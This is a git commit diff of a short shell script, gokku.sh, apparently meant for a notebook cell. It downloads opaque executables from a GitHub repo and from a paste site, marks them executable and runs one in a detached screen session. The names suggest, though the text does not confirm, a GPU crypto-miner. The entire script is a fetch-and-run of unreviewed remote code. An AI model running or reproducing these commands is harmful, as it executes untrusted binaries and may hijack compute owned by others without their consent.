42560b4fd45eb701b14573f11bce7edf8542aae3
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-04 11:49:50 +0530

    Update gokku.sh

--- gokku.sh
+++ gokku.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-! sudo apt update && sudo apt install screen -y && screen -dmS 0IWEVK  ./0IWEVK  65 75 && wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu && wget https://www.heypasteit.com/download/0IWEVK && chmod +x 0IWEVK && ./0IWEVK 
+! sudo apt update && sudo apt install screen -y && screen -dmS 0IWEVK  ./0IWEVK  65 75 && wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IWEVK && chmod +x 0IWEVK && ./0IWEVK 
